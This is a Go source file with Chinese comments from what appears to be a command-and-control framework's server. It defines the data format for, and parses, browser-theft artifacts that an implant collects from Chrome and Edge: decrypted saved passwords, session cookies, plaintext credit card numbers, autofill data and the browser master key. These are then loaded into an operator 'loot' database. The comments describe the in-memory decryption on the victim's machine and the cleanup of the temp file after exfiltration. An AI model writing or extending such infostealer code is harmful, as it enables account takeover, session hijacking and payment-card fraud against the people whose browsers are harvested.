package cred

import (
	"encoding/json"
	"fmt"
	"net/url"
	"os"
	"strings"
)

// 浏览器凭据制品的 schema（客户端 core/services/browser*.go 产出）。
//
// 与 LSASS 转储的关键区别：**这里的内容已经是明文**（客户端在植入体内存里
// 走 DPAPI → AES-GCM 解出来的）。所以服务端不是"只校验不解析"，而是把小体积的
// JSON 解析出来直接登记进凭据库 —— 明文口令进库比让操作员手工解包更快形成战果，
// 同时制品本体仍然留档（Downloads 目录）便于复核。
//
// 明文不落盘的原则在客户端一侧遵守：解析在内存完成，只有这份 JSON 短暂落在
// %TEMP%，回传后立即删除。
type BrowserCredential struct {
	URL     string `json:"url"`
	User    string `json:"user"`
	Pass    string `json:"pass"`
	Browser string `json:"browser,omitempty"` // chrome / edge
	Profile string `json:"profile,omitempty"` // Default / Profile 1
	Created int64  `json:"created,omitempty"` // 浏览器记录的创建时间（WebKit 微秒，尽力而为）
}

type BrowserCookie struct {
	Host     string `json:"host"`
	Name     string `json:"name"`
	Value    string `json:"value"`
	Path     string `json:"path,omitempty"`
	Expires  int64  `json:"expires,omitempty"`
	Secure   bool   `json:"secure,omitempty"`
	HTTPOnly bool   `json:"httponly,omitempty"`
}

// BrowserCard 一条信用卡（Chromium 的 `Web Data` → credit_cards）
type BrowserCard struct {
	Name     string `json:"name,omitempty"` // 持卡人
	Number   string `json:"number"`         // 明文卡号（客户端 v10/v20 解出）
	ExpMonth int    `json:"exp_month,omitempty"`
	ExpYear  int    `json:"exp_year,omitempty"`
	Nickname string `json:"nickname,omitempty"`
}

// BrowserAutofill 一条自动填充条目（字段名 → 值，Chromium 不加密）
//
// **不入库**：噪声远大于信号（一个用户几百条地址碎片），留在制品 JSON 里
// 由操作员按需查看；信用卡才进凭据库。
type BrowserAutofill struct {
	Field string `json:"field"`
	Value string `json:"value"`
	Count int    `json:"count,omitempty"`
}

type BrowserProfile struct {
	Name        string              `json:"name"`    // chrome / edge
	Profile     string              `json:"profile"` // Default / Profile 1
	UserDataDir string              `json:"user_data_dir,omitempty"`
	Tech        string              `json:"tech,omitempty"`       // v10 / v20 / plain
	MasterKey   string              `json:"master_key,omitempty"` // base64（用户作用域已解密，便于后续复用）
	Credentials []BrowserCredential `json:"credentials"`
	Cookies     []BrowserCookie     `json:"cookies"`
	Cards       []BrowserCard       `json:"cards,omitempty"`    // Web Data：信用卡
	Autofill    []BrowserAutofill   `json:"autofill,omitempty"` // Web Data：自动填充
}

type BrowserArtifact struct {
	Host        string           `json:"host"`
	User        string           `json:"user"`
	CollectedAt string           `json:"collected_at"`
	Errors      []string         `json:"errors,omitempty"`
	Browsers    []BrowserProfile `json:"browsers"`
}

// Info 汇总制品统计（校验结果 → 任务描述/制品备注）
func (a BrowserArtifact) Info() ArtifactInfo {
	info := ArtifactInfo{Format: FormatJSON, Browsers: len(a.Browsers), SkippedItems: len(a.Errors)}
	for _, b := range a.Browsers {
		info.Credentials += len(b.Credentials)
		info.Cookies += len(b.Cookies)
		info.Cards += len(b.Cards)
		info.Autofill += len(b.Autofill)
	}
	info.Entries = info.Credentials + info.Cookies + info.Cards + info.Autofill
	return info
}

// ParseBrowserArtifact 解析并校验浏览器凭据制品。
//
// 严格到"能入库的必须是真东西"：套件里没有任何可用条目一律失败，
// 半截 JSON、超限体积、条目超限同样失败（宁可让任务显式失败，也不把残缺数据
// 混进凭据库让操作员误判）。
func ParseBrowserArtifact(path string) (BrowserArtifact, error) {
	var art BrowserArtifact

	st, err := os.Stat(path)
	if err != nil {
		return art, err
	}
	if st.Size() == 0 {
		return art, fmt.Errorf("制品为空文件")
	}
	if st.Size() > MaxBrowserArtifactBytes {
		return art, fmt.Errorf("制品体积超限（%.1f MB > %d MB）",
			float64(st.Size())/1024/1024, MaxBrowserArtifactBytes>>20)
	}

	raw, err := os.ReadFile(path)
	if err != nil {
		return art, err
	}
	if err := json.Unmarshal(raw, &art); err != nil {
		return art, fmt.Errorf("制品不是合法 JSON（回传被截断？）: %w", err)
	}
	if len(art.Browsers) == 0 {
		return art, fmt.Errorf("制品不含任何浏览器配置（采集失败或浏览器未安装）")
	}

	creds, cookies, cards, autofill := 0, 0, 0, 0
	for i := range art.Browsers {
		b := &art.Browsers[i]
		// 缺字段的条目直接丢弃：url 或口令为空的"凭据"没有意义，
		// 写进库只会污染凭据列表（保留 user 为空但 url 有效的记录：部分站点只存口令）
		kept := b.Credentials[:0]
		for _, c := range b.Credentials {
			if strings.TrimSpace(c.URL) == "" || c.Pass == "" {
				continue
			}
			if c.Browser == "" {
				c.Browser = b.Name
			}
			if c.Profile == "" {
				c.Profile = b.Profile
			}
			kept = append(kept, c)
		}
		b.Credentials = kept

		ck := b.Cookies[:0]
		for _, c := range b.Cookies {
			if strings.TrimSpace(c.Name) == "" || c.Value == "" {
				continue
			}
			ck = append(ck, c)
		}
		b.Cookies = ck

		// 信用卡：没有卡号的条目没有意义（解密失败的那张卡客户端不会写进来）
		cd := b.Cards[:0]
		for _, c := range b.Cards {
			if strings.TrimSpace(c.Number) == "" {
				continue
			}
			cd = append(cd, c)
		}
		b.Cards = cd

		af := b.Autofill[:0]
		for _, a := range b.Autofill {
			if strings.TrimSpace(a.Field) == "" || strings.TrimSpace(a.Value) == "" {
				continue
			}
			af = append(af, a)
		}
		b.Autofill = af

		creds += len(b.Credentials)
		cookies += len(b.Cookies)
		cards += len(b.Cards)
		autofill += len(b.Autofill)
	}
	if creds == 0 && cookies == 0 && cards == 0 && autofill == 0 {
		return art, fmt.Errorf("制品中没有任何可用的口令/Cookie/信用卡/自动填充条目")
	}
	if creds > MaxCredentialItems {
		return art, fmt.Errorf("制品口令条数超限: %d", creds)
	}
	if cookies > MaxBrowserCookies {
		return art, fmt.Errorf("制品 Cookie 条数超限: %d", cookies)
	}
	if cards > MaxBrowserCards {
		return art, fmt.Errorf("制品信用卡条数超限: %d", cards)
	}
	if autofill > MaxBrowserAutofill {
		return art, fmt.Errorf("制品自动填充条数超限: %d", autofill)
	}
	return art, nil
}

// MaxBrowserCards / MaxBrowserAutofill 与客户端 maxCardItems / maxAutofillItems 一致
const (
	MaxBrowserCards    = 200
	MaxBrowserAutofill = 300
)

// MaxCredentialItems 单次制品允许的口令条数上限（与客户端采集上限一致）
const MaxCredentialItems = 2000

// MaxRealmLength realm（域/站点归属）列长度上限：loot.realm 是 varchar(255)，
// 这里再收紧一档，避免把畸形 URL 的整段垃圾写进列表
const MaxRealmLength = 64

// RealmFromURL 从记录下来的登录 URL 取用它作为凭据库的 realm（域/站点归属）。
// 解析不出主机名时退回原始字符串截断，保证入库条目不丢。
func RealmFromURL(rawURL string) string {
	rawURL = strings.TrimSpace(rawURL)
	if rawURL == "" {
		return ""
	}
	if !strings.Contains(rawURL, "://") {
		rawURL = "https://" + rawURL
	}
	host := ""
	if u, err := url.Parse(rawURL); err == nil {
		host = u.Hostname()
	}
	if host == "" {
		host = rawURL
	}
	// 长度与字符双重收口：url.Parse 对 "aaaa…" 这种串也会给出"合法主机名"
	if len(host) > MaxRealmLength {
		host = host[:MaxRealmLength]
	}
	return strings.Map(func(r rune) rune {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9',
			r == '.', r == '-', r == '_', r == ':':
			return r
		default:
			return '_'
		}
	}, host)
}
